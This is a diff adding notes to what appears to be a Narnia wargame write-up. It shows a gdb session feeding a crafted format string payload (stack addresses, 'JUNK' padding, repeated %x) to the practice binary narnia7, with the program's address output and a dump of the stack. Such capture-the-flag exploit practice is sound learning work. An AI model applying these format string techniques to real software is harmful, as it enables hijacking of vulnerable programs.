@@ -324,3 +324,30 @@ mohthuphog
 $ 
 
 Splat ;)
+
+=============== More elegant =================================================
+(gdb) r $(python -c'print "\x6c\xd6\xff\xff"+"JUNK"+"\x6d\xd6\xff\xff"+"JUNK"+"\x6e\xd6\xff\xff"+"JUNK"+"\x6f\xd6\xff\xff"+"JUNK"+"%x%x%x%x"*20')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /narnia/narnia7 $(python -c'print "\x6c\xd6\xff\xff"+"JUNK"+"\x6d\xd6\xff\xff"+"JUNK"+"\x6e\xd6\xff\xff"+"JUNK"+"\x6f\xd6\xff\xff"+"JUNK"+"%x%x%x%x"*20')
+goodfunction() = 0x80486e0
+hackedfunction() = 0x8048706
+
+before : ptrf() = 0x80486e0 (0xffffd5bc)
+I guess you want to come to the hackedfunction...
+
+Breakpoint 1, 0x08048685 in vuln ()
+(gdb) x/10s $esp
+0xffffd5a0:	"\300\325\377\377\200"
+0xffffd5a6:	""
+0xffffd5a7:	""
+0xffffd5a8:	"8\330\377\377\070\202\004\b\030\326\377\377\224\332\377\367"
+0xffffd5b9:	""
+0xffffd5ba:	""
+0xffffd5bb:	""
+0xffffd5bc:	"\340\206\004\bl\326\377\377JUNKm\326\377\377JUNKn\326\377\377JUNKo\326\377\377JUNK8048238ffffd618f7ffda94080486e0ffffd66c4b4e554affffd66d4b4e554affffd66e4b4e554affffd66f4b4e554a"
+0xffffd640:	"\002"
+0xffffd642:	""
+
+
